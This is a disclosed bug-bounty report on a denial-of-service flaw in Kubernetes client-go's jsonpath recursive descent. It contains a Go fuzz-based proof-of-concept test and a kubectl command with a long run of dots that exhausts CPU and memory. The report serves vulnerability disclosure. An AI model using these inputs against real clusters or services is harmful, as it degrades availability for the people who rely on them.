# DoS for client-go jsonpath func

## Report Details
- **Report ID**: 882923
- **URL**: https://hackerone.com/reports/882923
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-05-26T15:31:15.487Z
- **Disclosed**: 2020-07-24T03:46:15.593Z

## Reporter
- **Username**: lazydog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
## Summary:
jsonpath recursive descent  cause a DoS vul
`kubectl` `apiextensions-apiserver` `cli-runtime` and `kubernetes` is depends on `client-go`

I think `evalRecursive()` cause of this vulnerability
function pos: client-go/util/jsonpath/jsonpath.go:451

## Component Version:

client-go:master

## Steps To Reproduce:
i written a simple fuzz based on  go-fuzz, im so lucky to found a crasher.

  1. pull the latest kubernetes code 

```
git clone https://github.com/kubernetes/kubernetes
```

  2.change workdir to  `kubernetes/staging/src/k8s.io/client-go/util/jsonpath`
3.copy this poc to disk use `vim` or `cat`, change filename to `crash_tests.go`

```
package jsonpath

import (
	"testing"
 	"bytes"
 	"encoding/json"
)

type jsonpathcrashTest struct {
 name     string
 template string
 input    interface{}
}

func FuzzParse(test *jsonpathcrashTest, allowMissingKeys bool) error {

 j := New(test.name)

 j.AllowMissingKeys(allowMissingKeys)
 err := j.Parse(test.template)
 if err != nil {
  return err
 }

 buf := new(bytes.Buffer)
 err = j.Execute(buf, test.input)
 if err != nil {
  return err
 }

 return err
}

func Fuzz(data []byte) int {
 var input = []byte(`{
  "kind": "List",
  "items":[
    {
   "kind":"None",
   "metadata":{
     "name":"127.0.0.1",
     "labels":{
    "kubernetes.io/hostname":"127.0.0.1"
     }
   },
   "status":{
     "capacity":{"cpu":"4"},
     "ready": true,
     "addresses":[{"type": "LegacyHostIP", "address":"127.0.0.1"}]
   }
    },
    {
   "kind":"None",
   "metadata":{
     "name":"127.0.0.2",
     "labels":{
    "kubernetes.io/hostname":"127.0.0.2"
     }
   },
   "status":{
     "capacity":{"cpu":"8"},
     "ready": false,
     "addresses":[
    {"type": "LegacyHostIP", "address":"127.0.0.2"},
    {"type": "another", "address":"127.0.0.3"}
     ]
   }
    }
  ],
  "users":[
    {
   "name": "myself",
   "user": {}
    },
    {
   "name": "e2e",
   "user": {"username": "admin", "password": "secret"}
   }
  ]
   }`)

 var nodesData interface{}
 err := json.Unmarshal(input, &nodesData)
 if err != nil {
  print(err)
 }

 fuzzData := string(data)

 test := jsonpathcrashTest{name: "crash", template: fuzzData, input: nodesData}

 err = FuzzParse(&test, false)
 if err != nil {
  return 0
 }

 err = FuzzParse(&test, true)
 if err != nil {
  return 0
 }

 return 1
}


func TestCrash(t *testing.T) {
	var data = []byte("{..................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"...................." +
	"..........51}.")
	Fuzz(data)
}

```



4.run `go test` command, now we can see the test process use a lot of cpu and memeory


{F843537}

5.i found a real case in `kubectl`, if resource (like services pods node) has any record can cause DoS.

```
kubectl get services -o=jsonpath="{.....................................................................................................................................}"
```

{F843557}

## Impact

maybe in some scenes, attacker can cause DoS.

eg. cloud components use `client-go` util to process cluster resouce json record.

any other program exec  `kubectl`  with jsonpath options, and jsonpath params by user control.

## Attachments
- DoS_1.png
- DoS_2.png
